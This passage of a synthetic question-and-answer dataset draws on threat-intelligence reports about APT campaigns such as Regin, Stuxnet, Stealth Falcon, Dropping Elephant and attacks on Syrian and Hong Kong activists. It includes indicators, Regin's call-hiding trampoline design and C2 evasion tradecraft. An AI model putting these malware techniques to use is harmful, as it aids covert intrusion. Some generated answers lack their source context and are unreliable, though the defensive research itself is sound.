(<https://gist.github.com/9b/bef2907272cc770311c6>)here, the java-sec[.]com domain is linked to the java-se[.]com by shared hosting history at the following IP address:\n124.248.237.26\n223.29.248.9\n211.233.89.182\n112.175.143.2\n112.175.143.9\nIt is unclear why these actors would attack an IP address they were actively using. It's possible that the attackers wanted to test their botnet's capability by attacking an IP they were using to gather statistics on the size of the attack. It is also possible that the attackers simply made a mistake and accidentally issued commands to attack their own infrastructure. On Oct. 24, 2014, after attacking their own infrastructure, the attackers issued new instructions to their botnet that ceased all attacks.\nBig Headline: Conclusion\nWhile not conclusive, the evidence presented above shows a link between confirmed APT activity and ongoing DDoS attacks that appear to be designed to silence the Pro Democracy movement in Hong Kong. The evidence does not conclusively prove that the same actors responsible for the DDoS attacks are also behind the observed intrusion activity discussed above \u2013 such as Operation Poisoned Hurricane. Rather, the evidence may indicate that a common quartermaster supports both the DDoS attacks and ongoing intrusion activity.\nIn either scenario, there is a clear connection between the intrusion activity documented in Operation Poisoned Hurricane and the DDOS attacks documented here. While the tactics of these activities are very different from a technical perspective, each supports distinct political objectives. Operation Poisoned Hurricane's objective appeared to have in part been IP theft possibly for economic gain or other competitive advantages. In the DDOS attacks, the objective was to silence free speech and suppress the pro democracy movement in Hong Kong. The Chinese government is the entity most likely to be interested in achieving both of these objectives.\n\nAnswer this question based on the above context: How did the QTI International digital certificate link the DDoS attacks to previous APT activity, specifically Operation Poisoned Hurricane? Explain the connection through the use of specific malware samples and their behaviors.",
    "output": "The QTI International digital certificate was used to sign binaries in previous APT activity, including Operation Poisoned Hurricane. For instance, the hash 17bc9d2a640da75db6cbb66e5898feb1 represents a PlugX variant signed by this certificate, which connected to a Google Code project for its C2 server configuration. Another sample, 0b54ae49fd5a841970b98a078968cb6b, detected as Backdoor.APT.Preshin, was also signed with the QTI International certificate and connected to luxscena[.]com for C2. Additionally, the certificate was used to sign e2a4b96cce9de4fb126cfd5f5c73c3ed, detected as Backdoor.APT.PISCES, which used hk.java-se[.]com for C2. These connections demonstrate a direct link between the DDoS attacks and previous APT activity through shared infrastructure and malware signatures.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very Small Headline: ONE COMPROMISED SYSTEM, MULTIPLE VICTIMS\nThe threat group manually created a directory on its server for each compromised computer. These directories often contained multiple stolen Skype databases indicating that the victims shared computers. The threat group was likely able to acquire large collections of data by breaching only a relatively small number of systems due to the opposition's use of shared computers for satellite-based Internet access.\nSharing computers is likely a function of the realities of limited internet service in Syria. The multi-day Internet and phone blackouts that began occurring in Syria in 2012 (possibly the Syrian government's attempts to stifle opposition forces' communication capabilities, with some exceptions4) have driven opposition groups, media activists, political groups, and others to set up their own satellite communications systems for reliable two-way satellite Internet connectivity. Typically, they use 2-way satellite communications equipment known as Very Small Aperture Terminals (VSATs) connected to consumer grade networking equipment, like Wi-Fi routers. VSATs provide an expensive Internet lifeline to many groups within opposition-controlled parts of Syria.\nDue to expensive bandwidth, limited electricity, setup time, and the need to operate VSATs from a fixed location, individuals supporting a wide variety of Syrian opposition efforts often share connections and computers located in places like local media centers and operations rooms.5 As a result, a threat actor who successfully infects one person on a shared device can easily steal the Skype databases and stored documents of several targeted individuals or organizations as well.\nThe threat group was likely able to acquire large collections of data by breaching only a relatively small number of systems due to the opposition's use of shared computers for satellite-based Internet access.\n4  http://www.washingtonpost.com/blogs/worldviews/wp/2012/11/30/can-u-s-communication-kits-help-syrians-get-around-the-Internet-blackout/\n5 http://www.cbsnews.com/news/to-fight-assad-syrian-opposition-logs-on-at-any-cost/\nMedium Headline: A RANGE OF TOOLS FOR MULTIPLE PLATFORMS\nThe threat group's tools and tactics differ somewhat from those observed in previous activity targeting the Syrian opposition.6 Although this threat group uses the known tactic of deploying the DarkComet RAT, they do so using a multistage dropper that has not been previously observed. The group also uses a keylogger and what appear to be custom tools with shellcode payloads.\nThe threat actors have used these tools in conjunction with techniques such as:\nThis is also the first instance we have observed a threat group targeting the Syrian opposition using Android malware. Smart phones, in general, are valuable sources of data about individuals and their social networks, as they may contain address books, SMS messages, email, and other data (including data from mobile apps, such as Skype). Targeting Android may be particularly beneficial in the case of Syrian opposition members, where regular power blackouts in Syria may force people to rely more heavily on mobile devices for communications.\nDespite the wide array of tools and techniques at their disposal, the threat group does not appear to use software exploits to deliver malware to their targets. Instead, they seem to rely on a variety of social engineering techniques to trick victims into infecting themselves.\nAlthough this threat group uses the known tactic of deploying the DarkComet RAT, they do so using a multistage dropper that has not been previously observed.\n6  See, for example: https://www.eff.org/document/quantum-surveillance-familiar-actors-and-possible-false-flags-syrian-malware-campaigns; https://securelist.com/files/2014/08/KL_report_syrian_malware.pdf; https://citizenlab.org/2014/12/malware-attack-targeting-syrian-isis-critics/\nBig Headline: V. POTENTIAL THREAT GROUP SPONSORSHIP\nT he threat group's tools and tactics stand in contrast to the ways in which other Syrian groups (described publicly by a variety of researchers) have operated. In addition, while we do not have sufficient information to determine the identity of this group or the nature of its ties to Assad's forces, we have some indications that the group may be resourced and / or located outside of Syria.\nThe malware used by this threat group does not share any command and control servers with previously reported activity documented by research groups including Kaspersky, Trend Micro, CitizenLab, and the Electronic Frontier Foundation (EFF).7 In addition, the activity does not share any of the tactics or tools with activity profiled in another recently released report on potentially ISIS-linked malware in Syria.8\nThe threat group used a variety of malware, suggesting access to development tool resources. For example, while other Syrian threat groups have used DarkComet and other RATs extensively, this group deploys DarkComet using a custom dropper (BLACKSTAR) that may make the malware more difficult to detect. This threat group is also unique to date in leveraging the Metasploit Framework, custom malware tools (YABROD and CABLECAR), and Android malware. This demonstrates that the threat group is capable of acquiring and using a diverse malware arsenal. It remains unclear if they have developed this capacity internally or are receiving outside support.\nFinally, public reports of other suspected pro-Syrian threat actors have identified those groups' primary or fallback command and control (C2) servers as located within Syria itself (e.g., resolving to or directly referencing Syrian IP addresses, often in similar IP ranges.) However, this group's C2 servers were located outside of Syria. This may indicate that the group is not based in Syria itself, or that its sponsor's resources do not include the ability to provide the group with dedicated servers located in Syria.\n7 https://www.eff.org/document/quantum-surveillance-familiar-actors-and-possible-false-flags-syrian-malware-campaigns https://securelist.com/files/2014/08/KL_report_syrian_malware.pdf\n8 https://citizenlab.org/2014/12/malware-attack-targeting-syrian-isis-critics/\nFigure 8: Avatars\nMedium Headline: LEBANON: A RECURRING THEME\nWhile researching this activity, we came across numerous references to Lebanon. We observed a user in Lebanon upload what appear to be two test versions of malware used to target opposition elements (the YABROD downloader and the CABLECAR launcher). The avatars, social media seeding, and fake opposition website are also filled with references to Lebanon. During chats, for example, the female avatars often state that they are in Lebanon and demonstrate familiarity and interest in talking about issues there. Social media pages suggest that the avatars are refugees in the country, or are Lebanese.\nWhile researching the threat group's tactics, we came upon a reference to a 3-day training course in Lebanon in 2012 that described the use of eerily similar methods. According to media reports, a leaked Syrian intelligence memo titled \"Training Course for Internet and Social Media Activists\" describes the tactics that pro-Assad recruits\u2014many of whom were Lebanese members of Hezbollah's Islamic Resistance\u2014were trained to use.9 Do note that we are unable to determine the authenticity of the document, or whether it may represent disinformation.\nThe training included:\nEstablishing an \"Electronic Army\" to infiltrate Syrian activists' computers, websites and Internet accounts, and attempting to use stolen personal information against them.\nSetting up opposition social media accounts to spread false information and make accusations and counter-accusations to create conflict between opposition members in and out of Syria.\nThe use of women to entrap opposition members and activists using social media sites such as Skype and Facebook.10\n9 http://alkhaleejonline.net/#!/articles/1414221806705481300/, English translation available here: http://syria-cyber-warfare-intel-leak.pen.io\n10 http://syria-cyber-warfare-intel-leak.pen.io\nBig Headline: CONCLUSION\nA t first glance, this group's activity follows a familiar plot line: threat actors socially engineer their way into individuals' computers and then steal data. However, like all great plots, this one comes with a twist. The group regularly asked its targets about the device they used\u2014computer or Android phone\u2014probably so that they could then deploy malware specifically tailored to that device. In addition to the range of military and political documents stolen, the group focused on the victim's Skype databases, which included the victim's contacts and real time communications, providing the threat actors with an inside view into the opposition's relationships and plans. We suspect they often found their next targets in the victim's Skype contacts as well. As the warzone reality of expensive satellite internet forced opposition members to rely on shared devices, compromising a single device yielded the combined plans and communications of multiple aspects of the opposition.\nUnlike other threat activity that we have profiled, this is not just cyber espionage aimed at achieving an information edge or a strategic goal. Rather, this activity, which takes place in the heat of a conflict, provides actionable military intelligence for an immediate battlefield advantage. It provides the type of insight that can thwart a vital supply route, reveal a planned ambush, and identify and track key individuals. This intelligence likely serves a critical role in the adversary's operational plans and tactical decisions. However, this tactical edge comes with a potentially devastating human cost.\n\nAnswer this question based on the above context: How did the threat group's focus on Skype databases contribute to their overall strategy, and what additional risks did this pose to the opposition?",
    "output": "By focusing on Skype databases, the threat group gained access to victims' contacts and real-time communications, providing an inside view into the opposition's relationships and plans. This allowed them to identify and target additional individuals within the opposition network. Given the shared use of devices, compromising a single device yielded the combined plans and communications of multiple aspects of the opposition. This intelligence could thwart supply routes, reveal planned ambushes, and track key individuals, providing immediate battlefield advantages but also posing a potentially devastating human cost.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 2.2 Stuxnet Timeline\nVirusBlokAda reportedly detected Stuxnet components as Trojan-Spy.0485 and MalwareCryptor.Win32.Inject.gen on 17th June 2010 (), and also described the .LNK vulnerability on which most of the subsequent attention was focused. However, it seems that Microsoft, like most of the security industry, only became aware (or publicly acknowledged) the problem in July. (See: )\nRealtek Semiconductor were notified of the theft of their digital signature keys on 24th June 2010. ().\nESET was already detecting some components of the attack generically early in July 2010, but the magnitude of the problem only started to become obvious later that month. Siemens don't seem to have been notified (or at any rate acknowledged receipt of notification) until 14th July 2010. . On the same day, another driver was compiled as subsequently revealed by ESET analysis and reported on 19th July:\nOn the 15th July, Brian Krebs was, as usual, ahead of the pack at in pointing out that there was a control systems issue. Advisories were posted by US-CERT and ICS-CERT (; .)\nA Microsoft advisory was posted on 16th July (), supplemented by a Technet blog (). The Internet Storm Center also commented: . See also MITRE Common Vulnerabilities and Exposures (CVE) #CVE-2010-2568\nMicrosoft Security Advisory #2286198 Workaround: ; ; ;\nOn the 17th July, the Verisign certificate assigned to Realtek Semiconductor was revoked (http://). However, the second driver, now using a JMicron certificate was identified: . The first of a comprehensive series of ESET blogs was posted.\nTable 2.2.1 \u2013 Stuxnet-Related Blogs by ESET\nOn the 19th SANS posted an advisory regarding the .LNK vulnerability (), and on the 19th and 20th July Siemens updated its posts:\nESET labs were now seeing low-grade Autorun worms, written in Visual Basic, experimenting with the .LNK vulnerability, and had added generic detection of the exploit (LNK/Exploit.CVE-2010-2568). Most AV companies had Stuxnet-specific detection by now, of course. Some of the malware using the same vulnerability that appeared around that time was described by David Harley in a Virus Bulletin article, \"Chim Chymine: a Lucky Sweep?\" published in September 2010.\nThe Internet Storm Center raised its Infocon level to yellow in order to raise awareness of the issue (). (<http://news.softpedia.com/news/PoC-Exploit-Code-Available-for-Windows-LNK-Vulnerability-148140.shtml>)Softpedia and (<http://www.computerworld.com/s/article/9179339/Windows_shortcut_attack_code_goes_public?taxonomyId=17&pageNumber=1>)Computerworld, among others, noted the publication of exploit code using the .LNK vulnerability.\nWired magazine reported that it was well-known that some Siemens products made use of hard-coded passwords, as described above:\nSiemens has made quite a few advisories available, but has not really addressed the hard-coded password issue directly, and some pages appear to have been withdrawn at the time of writing. The following pages were still available:\nA number of new malware families were identified using same vulnerability in late July, and a number of other families such as Win32/Sality generated new variants that also used it.\nWin32/TrojanDownloader.Chymine.A downloads Win32/Spy.Agent.NSO keylogger; Win32/Autorun.VB.RP, and is similar to malware described by ISC on 21st July (), but updated to include the CVE-2010-2568 exploit for propagation.\nPierre-Marc Bureau and David Harley blogged on the subject at , and Harley explored the issues further in (<http://securityweek.com/shortcuts-insecurity-lnk-exploits>)\"Shortcuts to Insecurity: .LNK (<http://securityweek.com/shortcuts-insecurity-lnk-exploits>)Exploits\" at , and \"Chim Chymine: a lucky sweep?\" in the September issue of Virus Bulletin.\nAryeh Goretsky's blog at comments on the Microsoft patch which finally appeared at the beginning of August: see .\nFurther Microsoft issues were addressed in September, as described in this document. See also .\nMicrosoft released a security update to address the Print Spooler Service vulnerability used by Stuxnet. The vulnerability only exists where a printer is shared, which is not a default.\n.\nFurther fixes promised for two Elevation of Privilege vulnerabilities.\nRalph Langner's analysis of how Stuxnet affects a vulnerable installation was further discussed at the ACS conference in September 2010, but AV industry analysis did not fully concur.\nRelated last-minute presentations at Virus Bulletin 2010:\nMuch of the earlier controversy about the origin and targeting of Stuxnet derived from uncertainty about exactly what its code was meant to do. Even after it was established that it was intended to modify PLC (Programmable Logic Controller) code, details of the kind of installation targeted remained unclear.\nHowever, research into this aspect of the Stuxnet code by Symantec et al, blogged by Eric Chien at http://www.symantec.com/connect/blogs/stuxnet-breakthrough, told us that \"Stuxnet requires the industrial control system to have frequency converter drives from at least one of two specific vendors, one headquartered in Finland and the other in Tehran, Iran. This is in addition to the previous requirements we discussed of a S7-300 CPU and a CP-342-5 Profibus communications module.\" He goes on to describe in some detail the workings of the relevant Stuxnet code. Symantec's hefty (<http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/w32_stuxnet_dossier.pdf>)Stuxnet (<http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/w32_stuxnet_dossier.pdf>)dossier was updated accordingly.\nThis didn't put a complete end to the speculation, of course. In fact, some of the speculation actually grew wilder. Most notably, Sky News, tired of mere factual reporting and even half-informed speculation, (<http://news.sky.com/skynews/Home/video/Stuxnet-Worm-Virus-Targeted-At-Irans-Nuclear-Plant-Is-In-Hands-Of-Bad-Guys-Sky-News-Sources-Say/Video/201011415828645>)took off for planet Fantasy, where it discovered that the Sky really is falling, claiming that the \"super virus\" is being traded on the black market and \"could be used by terrorists\". That, we suppose, would be the bad guys as opposed to the saintly individuals who originally put Stuxnet together, very possibly to attack nuclear facilities.\nOur view is that, given the amount of detailed analysis that's already available, anyone with malicious intent and a smidgen of technical skill would not need the original code.\nThere is certainly substantial evidence suggesting that equipment used for uranium enrichment in nuclear facilities, perhaps in Iran, was the original target. However, Will Gilpin, apparently an IT security consultant to the UK government, suggested that possession of \"the virus\" in whatever form has alarming potential:\n\"You could shut down the police 999 system.\n\"You could shut down hospital systems and equipment.\"\n\"You could shut down power stations, you could shut down the transport network across the United Kingdom.\"\nThese assertions clearly owed little to the PLC code actually discussed in the competent analyses above. While it might be possible to do all these things, that would require extensive re-engineering of the existing code and possibly a completely new set of 0-days.\nWhile it's by no means all-inclusive, the timeline at is pretty comprehensive.\nThe Langner team at finished the year 2010 with a blog summarizing the \"up-to-date bottom line\" on their view of Stuxnet. Of course, they had published a steady stream of interesting and relevant blogs at before that, some of which have been listed in this document.\nAs of version 1.31 of this document, we will not be publishing further revisions except to correct errors or to introduce substantial new or modified material. We will, however, be adding links from time to time to the ESET blog entry at .\n\nQ: What were the key milestones in the timeline of Stuxnet's detection and response, and how did the security community adapt to the evolving threat?",
    "output": "A: Key milestones in the timeline of Stuxnet's detection and response included the initial identification by VirusBlokAda in June 2010, followed by broader recognition in July. Notifications to Realtek and Siemens, advisories from US-CERT and ICS-CERT, and Microsoft's security advisory marked significant steps in the response. The revocation of the Realtek certificate and the identification of a second driver using a JMicron certificate were crucial developments. The security community adapted by enhancing detection mechanisms, analyzing the malware's code, and sharing findings through blogs and advisories. ESET, Symantec, and other firms played pivotal roles in providing comprehensive analyses and updates, contributing to a deeper understanding of Stuxnet's capabilities and targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 4.4 payload invocation\nAfter the payload has been retrieved and loaded into memory alongside its dependencies, Regin's 64-bit stage #1 will first transfer control to the entrypoint of the payload. Once execution of the payload's entrypoint is completed, the malware will process the payload's export table, retrieve the address for the entry exported with ordinal 1, and execute it. The relevant code portion, appropriately edited, is presented in Listing 8. The way the payload is handled and control is passed to it, makes it clear that the next stage of this complex threat is also a 64-bit Dynamic Link Library.\nListing 8: Invocation of the next stage\nWith the information extracted by analyzing the code of the sample, it is possible to reconstruct the type of parameters passed to the payload's export #1. The reconstructed prototype of the exported entry is presented in Listing 9.\nListing 9: Reconstructed prototype for Ordinal #1 of the payload\ntypedef struct PayloadInputStructure {\nHMODULE hSelf ;\nHTHREAT hThread ;\n/*  Loaded by LoadLibraryEx ( . . . , DONT_RESOLVE_DLL_REFERENCES) * /\nHMODULE hSelfNoDep ;\n} PayloadInputStructure ;\n// Reconstructed prototype void __fastcall ordinal_1 ( PayloadInputStructure  * pInput ) ;\n\nQ: How does Regin's 64-bit stage #1 handle the invocation of the next stage, and what kind of parameters are passed to the payload's export #1? Explain the significance of this approach in the context of the malware's operation.",
    "output": "A: Regin's 64-bit stage #1 handles the invocation of the next stage by first transferring control to the entrypoint of the payload. After executing the payload's entrypoint, the malware processes the payload's export table to retrieve the address for the entry exported with ordinal 1 and then executes it. This approach indicates that the next stage of the Regin malware is also a 64-bit Dynamic Link Library. The parameters passed to the payload's export #1 are structured in a PayloadInputStructure, which includes three members: hSelf (a handle to the current module), hThread (a handle to the current thread), and hSelfNoDep (a handle to the current module loaded without resolving DLL references). The significance of this approach lies in the malware's ability to dynamically load and execute additional stages, allowing for modular and flexible operations, which can complicate detection and analysis efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 5. Stealth Falcon's Widespread Targeting of UAE Figures\nThis section describes how we identified additional Stealth Falcon victims and bait content, and traced Stealth Falcon's spyware to additional C2 servers.\nGiven Stealh Falcon's use of public Twitter mentions to contact individuals, we searched Google and Twitter for instances of aax.me links. The links we found indicated that we could easily probe aax.me to get a comprehensive list of all currently active short URLs, and their corresponding long URLs. Our findings point to a UAE-focused operator, whose bait content and targets are linked to the Emirates. Furthermore, we were able to connect this attack to case from December 2012, where an anonymous UAE activist contacted us and claimed to have received a suspicious link from a Twitter account that was purportedly under government control.\nMedium Headline: 5.1. Public Targets and Links to Arrests\nThis section describes 24 Stealth Falcon Twitter targets we identified on the basis of them receiving an aax.me link in a Twitter mention.\nWe found aax.me links targeting 24 accounts, each of whom was mentioned in a tweet that also contained an aax.me shortened link. We were unable to get details about 17 of the accounts. Of the accounts we have been able to identify, several individuals were subsequently arrested or convicted in absentia by the UAE Government in relation to their online activities.\nThe following table outlines these cases, and notes arrests. For completeness, the table includes the cases from Section 4.14.3:\nWe list additional details in Appendix D: Public Stealth Falcon Tweets.\nMedium Headline: 5.2. Ennumerating aax.me for Bait Content\nThis section describes how we probed every conceivable short URL on aax.me, and found 402 pieces of bait content that we believe were sent by Stealth Falcon.\nAll of the public aax.me links we found, as well as the links sent to Donaghy, matched the regular expression /aax\\.me\\/[0-9af]{5}/. Assuming all links shortened via aax.me match this regular expression, there are only 165 (1,048,576) possible short URLs. We sent a request to aax.me for each possible URL, and observed the returned page or redirect. We found 57 URLs that exhibited the redirect.php profiling behavior, and 524 URLs that returned an HTTP 302 redirect to an expanded URL. The other 1,047,995 aax.me links returned a HTTP 302 redirect to the aax.me homepage; we assume these short URLs were unassigned to an expanded URL, as of the time of our scan.\nWe coded the long URLs where the URLs were still active, or where we could find an archived copy of, or some information about, the URL. We were able to code 535 URLs, and failed to code 46 URLs as the corresponding websites were down, and we could not find reliable information about what content the URLs contained. See Appendix E: Results of aax.me Scan for details. We coded 133 URLs as \"advertisement\" (25% of all coded URLs), as they appeared to represent an advertisement for a product. The vast majority of these advertisements seemed to be products typically marketed via spam (e.g., \"dietary supplement\" or \"green coffee\"). We suspect that these links may have been shortened by spammers, as the aax.me URL shortening page is pubilcly accessible and indexed by Google, and YOURLS advises that publicly accessible URL shorteners will receive spam. 83 All \"advertisement\" links were 302 redirects, and none were redirect.php links. This is consistent with our observation that the aax.me public interface only permits visitors to shorten links using the 302 redirect method.\nWe filtered out the short URLs classified as \"advertisement.\" There were 402 non-advertisement short URLs that we tagged. We display a summary of the top ten tags below:\nWe noted that a number of long URLs had multiple corresponding short URLs. We display the top ten long URLs below.\n\nBased on the above text, answer a question. How did the researchers identify additional Stealth Falcon victims and trace their spyware to additional C2 servers? Explain the methodology and its significance in uncovering the extent of the operation.",
    "output": "The researchers identified additional Stealth Falcon victims and traced their spyware to additional C2 servers by leveraging the group's use of public Twitter mentions to contact individuals. They searched Google and Twitter for instances of aax.me links, which are shortened URLs used by Stealth Falcon. By probing aax.me, they obtained a comprehensive list of all currently active short URLs and their corresponding long URLs. This methodology allowed them to uncover a UAE-focused operator whose bait content and targets were linked to the Emirates. The significance of this approach lies in its ability to reveal the widespread nature of the operation and its connection to a case from December 2012, where an anonymous UAE activist reported receiving a suspicious link from a Twitter account allegedly under government control.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nChina Chopper is an increasingly popular Web shell that packs a powerful punch into a small package. In the space of just 4 kilobytes, the Web shell offers file and database management, code obfuscation, and more\u2014all in an easy-to-use graphical user interface that even novices can use.\nGiven its growing prevalence, especially among Chinese cybercriminals, China Chopper warrants much more exposure than it has received to date. Outside of an insightful blog post from security researcher Keith Tyler1, little useful information on China Chopper is publically available.\nTo contribute something new to the public knowledge base\u2014especially for those who happen to find the China Chopper server-side payload on one of their Web servers\u2014FireEye studied the components, capabilities, payload attributes, and the detection rate of this 4 kilobyte menace.\nThis report describes the features that make China Chopper an increasingly popular tool for cyber attackers. And more important, the report explains how security professionals can better detect the Web shell through network traffic and on compromised systems.\n\nWhy is China Chopper considered a significant threat despite its small size, and what key features make it particularly appealing to cyber attackers, especially those associated with Chinese cybercriminals? Additionally, how can security professionals enhance their ability to detect this Web shell both in network traffic and on compromised systems?",
    "output": "China Chopper is considered a significant threat due to its compact size of just 4 kilobytes, which allows it to offer extensive capabilities such as file and database management, code obfuscation, and more, all within an easy-to-use graphical user interface. This makes it accessible even to novice users. Its popularity, especially among Chinese cybercriminals, highlights the need for greater awareness and understanding of this tool. To enhance detection, security professionals should study the components, capabilities, payload attributes, and detection rates of China Chopper. This involves analyzing network traffic patterns associated with the Web shell and identifying indicators of compromise on affected systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Naikon APT use lateral movement to achieve its objectives in the South China Sea region?",
    "output": "Lateral movement is a critical component of the Naikon APT's attack strategy, allowing them to move undetected through a network and gain access to sensitive information. According to the APT report, the Naikon APT uses various techniques to achieve lateral movement, including the use of custom-built HDoor tools, which support the identification of, interfacing with, and attacking of multiple technologies and resources. These tools enable the attackers to scan for open ports, identify potential targets, and establish a foothold on the network. Additionally, the report notes that the Naikon APT uses publicly-available system administration tools and utilities, such as ftp.exe, systeminfo.exe, and ipconfig, to gather information about the network and move laterally. The attackers also use techniques such as process hollowing and code injection to evade detection and maintain persistence on the network. Furthermore, the report highlights the use of 'c:\\intel' directory as a staging point for the attackers, where they store stolen files, operational logs, and tool configurations. This suggests that the Naikon APT is using lateral movement to establish a persistent presence on the network and gather sensitive information. Overall, the Naikon APT's use of lateral movement enables them to achieve their objectives in the South China Sea region, including targeting high-profile government and military agencies.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Attack Method: Infection Vector\nDropping Elephant uses two main infection vectors that share a common, and fairly elaborately maintained, social engineering theme \u2013 foreign relations with China.\nThe first approach involves spear-phishing targets using a document with remote content. As soon as the user opens the document, a \"ping\" request is sent to the attackers' server. At this point, the attackers know the user has opened the document and send another spear-phishing email, this time containing an MS Word document with an embedded executable. The Word document usually exploits CVE-2012-0158. Sometimes the attackers send an MS PowerPoint document instead, which exploits CVE-2014-6352.\nOnce the payload is executed, an UPX packed AutoIT executable is dropped. Upon execution, this downloads additional components from the attackers' servers. Then the stealing of documents and data begins.\nThe second approach involves capturing victims through watering hole attacks. The actor created a website that downloads genuine news articles from other websites. If a website visitor wants to view the whole article they would need to download a PowerPoint document. This reveals the rest of the article, but also asks the visitor to download a malicious artifact.\nThe two main infection vectors are supported by other approaches. Sometimes, the attackers email out links to their watering hole websites. They also maintain Google+, Facebook and twitter accounts to develop relevant SEO and to reach out to wider targets. Occasionally, these links get retweeted, indiscriminately bringing more potential victims to their watering holes.\nMedium Headline: 1. Malware Analysis\nThe backdoor is usually UPX packed but still quite large in size. The reason for this is that most of the file comprises meaningless overlay data, since the file is an automatically generated AutoIT executable with an AutoIT3 script embedded inside. Once started, it downloads additional malware from the C2 and also uploads some basic system information, stealing, among other things, the user's Google Chrome credentials. The backdoor also pings the C2 server at regular intervals. A good security analyst can spot this while analyzing firewall log files and thereby find out that something suspicious might be going on in the network.\nGenerally speaking, backdoors download additional malware in the form of encrypted or packed executables/libraries. But, in the case of Dropping Elephant, the backdoor downloads encoded blobs that are then decoded to powershell command line \"scripts\". These scripts are run and, in turn download the additional malware.\nOne of the more interesting malware samples downloaded is the file-stealer module. When this file-stealer is executed, it makes another callback to the C2 server, downloading and executing yet another malware sample. It repeatedly attempts to iterate through directories and to collect files with the following extensions: doc, docx, ppt, pptx, pps, ppsx, xls, xlsx, and pdf. These files are then uploaded to the C2 server.\nAlso interesting are the resilient communications used by this group. Much like the known actors Miniduke or CommentCrew, it hides base64 encoded and encrypted control server locations in comments on legitimate web sites. However, unlike the previous actors, the encrypted data provides information about the next hop, or the true C2 for the backdoor, instead of initial commands.\nMedium Headline: 2. C2 Analysis\nIn many cases it was very difficult to get a good overview of the campaign and to find out how successful it is. By combining KSN data with partner-provided C2 server data, we were able to obtain a much fuller picture of the incident.\nWe examined connections and attack logins to this particular C2. As it turned out, the attackers often logged in via a VPN, but sometimes via IPs belonging to an ordinary ISP in India. We then looked at the time the attackers were active, of which you can find an image below.\nBig Headline: Victim Profile and Geography\nWe also wanted to get a better idea of the geolocation of most visitors. Analysis of the image provided access counts and times, along with the IP of the visiting system.\nNoteworthy are the many IPs located in China. This focus on China-related foreign relations was apparent from the ongoing social engineering themes that were constant throughout the attacks. The concentration of visits from CN (People's Republic of China) could be for a variety of reasons \u2013 diplomatic staff are visiting these sites from their CN offices, CN academics and analysts are very interested in researching what they believe to be CN-focused think\ntanks, or some of the IPs are unknown and not self-identifying as bots or scrapers. Regardless, because we were able to determine that multiple targets are diplomatic and governmental entities, these foreign relations efforts are likely to represent the main interest of the attackers.\n\nHow does the Dropping Elephant APT group ensure resilient communications with its C2 servers, and how does this differ from other known threat actors like Miniduke or CommentCrew?",
    "output": "The Dropping Elephant APT group employs a sophisticated method for maintaining resilient communications by hiding base64 encoded and encrypted control server locations in comments on legitimate websites. Unlike actors such as Miniduke or CommentCrew, which use similar techniques to deliver initial commands, Dropping Elephant's encrypted data provides information about the next hop or the true C2 server for the backdoor. This method enhances the group's ability to evade detection and maintain persistent control over infected systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does North Korea utilize its global network of state-run businesses for espionage, money laundering, and drug trafficking, and what role does the Reconnaissance General Bureau play in this network?",
    "output": "North Korea operates a global network of state-run businesses in 30 to 40 countries, primarily in China, for espionage activities. These businesses include cafes and other non-suspect establishments that send over $100 million in cash annually to the regime and provide cover for spies. They are also used for money laundering and drug trafficking. The Reconnaissance General Bureau is responsible for oversight of this network, ensuring that it supports the regime's intelligence and financial objectives.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 2.10  imports & trampolines\nImport resolution is the crucial part for achieving Regin stage #1's goal of hiding the originator of system calls from external observers. The loader will correctly resolve the address of imported functions, but will embed these addresses in so-called 'trampoline' code. Addresses to the trampolines are instead added to the Import Address Table (IAT). From there, the execution will traverse different\npieces of code, eventually triggering the requested external subroutine before finally returning to the payload.\nBefore getting into details, it is important to have an idea of how the trampolines work from a high-level perspective.\nSmall Headline: A trampoline transition can be summarized as follows:\n1. Payload invokes \"resolved\" external subroutine\n2. Trampoline code receives control\na. Trampoline code retrieves the previously-resolved real address of the external subroutine\nb. Trampoline invokes the pre-API call code\n3. Pre-API call code prepares the environment to make the function call return to trusted location inside trusted module\na. Pre-API call code invokes the external subroutine\n4. External subroutine performs its duty\na. External subroutine returns\n5. Execution lands in appropriate part of trusted module\n6. Jump to post-API call code is executed\n7. Post-API call code receives control\na. Post-API call code restores the environment for payload\nb. Post-API call code transfers control back to payload, as would normally happen after a call to an external subroutine\n8. Payload continues its operations\nIn the following subsections we will discuss the details of how the malware retrieves and pieces together all the information required to produce and install the trampolines.\nAppendix B contains a diagram detailing a complete transition between the payload and an external module exporting a function.\nSmall Headline: 2.10.1 embedded code templates\nThe stage #1 malware uses predefined code for pre-API-call and post-API-call operations. This code is embedded in the binary and is almost ready for use, but it requires some customization to account for differences when it comes to memory addresses.\nThe malware is aware of the start address of both pieces of code inside its own body, and has a rough idea of the size of the two code portions. The builder code contains wrong values for the size of both templates. This is most likely a remnant of a previous code version that contained templates that were bigger.\nWith this information, the malware scans those sections of code looking for specific DWORDs that mark locations that need customization.\nAs an example, we report a screenshot of the post-API-call code (Image 6). The value of 0x99119911 as the second operand of the last instruction in this code portion is a placeholder that acts as a marker for the builder code.\nThe offset of the values needing customization are marked by the values:\ny pre-API-call code:\n\u25ca 0x66116611\n\u25ca 0x77117711\n\u25ca 0x88118811\ny post-API-call code:\n\u25ca 0x99119911\nImage 6: Post-API-call code\nThe addresses of such markers relative to the beginning of the owner code portion are recorded for later use. After all the information is recorded, Regin's stage #1 copies both the pre-API-call and the post-API-call code portions to newly allocated memory regions.\nSmall Headline: 2.10.2  locating a safe location inside a trusted module\nFor the trampolines to be successful, a safe location inside a trusted kernel module needs to be found. After the trampolines are in place, the affected module will be the one that is seen and \"blamed\" by an external observer every time the payload executes a call to an external subroutine.\nTo find this location, Regin's stage #1 scans all the sections that are executable and non pageable from a set of trusted modules. This set of modules includes:\ny NTOSKRNL.EXE\ny 